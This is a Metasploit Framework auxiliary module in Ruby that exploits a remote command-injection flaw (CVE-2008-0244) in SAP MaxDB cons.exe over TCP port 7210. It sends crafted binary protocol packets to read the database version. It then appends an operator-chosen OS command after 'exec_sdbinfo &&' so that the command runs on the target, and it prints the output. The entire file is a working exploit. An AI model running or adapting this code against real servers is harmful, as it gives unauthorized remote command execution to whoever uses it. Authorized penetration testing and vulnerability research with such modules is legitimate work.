##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SAP MaxDB cons.exe Remote Command Injection',
			'Description'    => %q{
					SAP MaxDB is prone to a remote command-injection vulnerability
					because the application fails to properly sanitize user-supplied input.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['OSVDB', '40210' ],
					['BID', '27206'],
					['CVE', '2008-0244'],
				],
			'DisclosureDate' => 'Jan 9 2008'))

			register_options(
				[
					Opt::RPORT(7210),
					OptString.new('CMD', [ false, 'The OS command to execute', 'hostname']),
				], self.class)
	end

	def run
		connect

		#Grab the MaxDB info.
		pdbmsrv =  "\x5A\x00\x00\x00\x03\x5B\x00\x00\x01\x00\x00\x00\xFF\xFF\xFF\xFF"
		pdbmsrv << "\x00\x00\x04\x00\x5A\x00\x00\x00\x00\x02\x42\x00\x04\x09\x00\x00"
		pdbmsrv << "\x00\x40\x00\x00\xD0\x3F\x00\x00\x00\x40\x00\x00\x70\x00\x00\x00"
		pdbmsrv << "\x00\x07\x00\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00"
		pdbmsrv << "\x07\x49\x33\x34\x33\x32\x00\x04\x50\x1C\x2A\x03\x52\x01\x03\x72"
		pdbmsrv << "\x01\x09\x70\x64\x62\x6D\x73\x72\x76\x00"

		db_version =  "\x28\x00\x00\x00\x03\x3f\x00\x00\x01\x00\x00\x00\xc0\x0b\x00\x00"
		db_version << "\x00\x00\x04\x00\x28\x00\x00\x00\x64\x62\x6d\x5f\x76\x65\x72\x73"
		db_version << "\x69\x6f\x6e\x20\x20\x20\x20\x20"

		sock.put(pdbmsrv)
		sock.get_once
		sock.put(db_version)

		ver = sock.get_once || ''

		info = ver[27,2000]
		if (info.length > 0)
			print_status(info)
		end

		#Send our command.
		len = 39 + datastore['CMD'].length

		data =  len.chr + "\x00\x00\x00\x03\x3F\x00\x00\x01\x00\x00\x00\x54\x0D\x00\x00"
		data << "\x00\x00\x04\x00" + len.chr + "\x00\x00\x00\x65\x78\x65\x63\x5F\x73\x64"
		data << "\x62\x69\x6E\x66\x6F\x20\x26\x26" + "#{datastore['CMD']}"

		sock.put(data)

		res = sock.get_once
		print_line(res)

		disconnect

	end

end
